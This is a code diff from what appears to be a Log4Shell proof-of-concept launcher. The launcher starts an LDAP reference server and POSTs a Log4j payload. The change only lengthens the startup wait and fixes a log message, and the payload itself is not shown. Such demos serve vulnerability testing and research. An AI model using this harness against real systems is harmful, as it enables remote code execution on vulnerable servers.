@@ -13,9 +13,9 @@ public class Launcher {
 		new LDAPRefServer().start();
 		new Thread(() -> {
 			try {
-				System.err.println("!! Waiting for 1 second to get ready");
-				Thread.sleep(1000);
-				System.err.printf("!! POSTing Log4j payload%n%s%n");
+				System.err.println("!! Waiting for 5 seconds to get ready");
+				Thread.sleep(5000);
+				System.err.printf("!! POSTing Log4j payload%n");
 				HttpClient client = HttpClient.newHttpClient();
 				client.send(HttpRequest
 					.newBuilder()
